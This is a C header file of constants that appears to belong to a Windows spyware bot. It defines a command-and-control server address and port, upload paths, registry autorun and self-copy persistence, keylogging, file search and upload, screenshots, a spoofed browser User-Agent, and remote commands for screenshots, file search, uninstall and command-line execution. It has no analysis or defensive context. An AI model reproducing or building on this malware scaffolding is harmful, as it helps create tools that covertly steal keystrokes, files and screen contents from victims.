#define MAX_REG					256
#define MAX_SERVER				256
#define MAX_HTTP				512
#define MAX_FILE				32
#define MAX_BOT_ID_LEN			128
#define MAX_CRYPT_KEY_LEN		128
#define MAX_NUM_CMD				128
#define MAX_DATA_CONTAIN		256
#define MAX_KEYLOG_QUEUE		128
#define DEBUG_MODE				0

// SECTION
#define SECTION_REG				"REG"
#define	SECTION_SERVER			"C&C"
#define SECTION_HTTP			"HTTP"
#define SECTION_FILE			"FILE"

// [REG]
#define REG_KEY_PATH			"KEY_PATH"
#define REG_KEY_NAME			"KEY_NAME"
#define REG_AUTORUN_PATH		"AUTORUN_PATH"
#define REG_AUTORUN_NAME		"AUTORUN_NAME"
#define REG_COPY_PATH			"COPY_PATH"
#define REG_COPY_PATH_2000_xp	"COPY_PATH_2000_xp"

// [SERVER]
#define SERVER_ADDRESS			"ADDRESS"
#define SERVER_PORT				"PORT"
#define SERVER_HELLO_PATH		"HELLO_PATH"
#define SERVER_DATA_UPLOAD_PATH	"DATA_UPLOAD_PATH"

// [FILE]
#define FILE_KEYLOG				"KEYLOG"
#define FILE_SEARCH				"SEARCH"
#define FILE_SEARCH_UPLOADED	"SEARCH_UPLOADED"
#define FILE_SCREENSHOT			"SCREENSHOT"

// [KEY]
#define KEY_CRYPT_DATA			"CRYPT_DATA"

// HTTP parameter
#define HTTP_GET				"GET"
#define HTTP_POST				"POST"

#define HTTP_USER_AGENT			"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\r\n"
#define HTTP_ACCEPT				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
#define HTTP_ACCEPT_LANGUAGE	"Accept-Language: vi-VN,en;q=0.8,vi;q=0.5,en-US;q=0.3\r\n"
#define HTTP_ACCEP_ENCODING		"Accept-Encoding: gzip, deflate\r\n"
#define HTTP_DNT				"DNT: 1\r\n"
#define HTTP_CONNECTION			"Connection: keep-alive\r\n"
#define HTTP_CONTENT_TYPE		"Content-Type: application/x-www-form-urlencoded\r\n"
#define HTTP_CACHE_CONTROL		"Cache-Control"
#define HTTP_POST_HEAD			"Content-Type: multipart/form-data; boundary=----%s\r\n\r\n"
#define HTTP_POST_HEAD_BEGIN	"------%s\r\nContent - Disposition: form - data; name = \"file\"; filename=\"%s\"\r\n\r\n"
#define HTTP_POST_HEAD_END		"\r\n------%s--"

// remote script command
#define RC_UNINSTALL			"uin"
#define RC_SCREENSHOT			"scr"
#define RC_SEARCHFILE			"sch"
#define RC_COMMANDLINE			"cli"
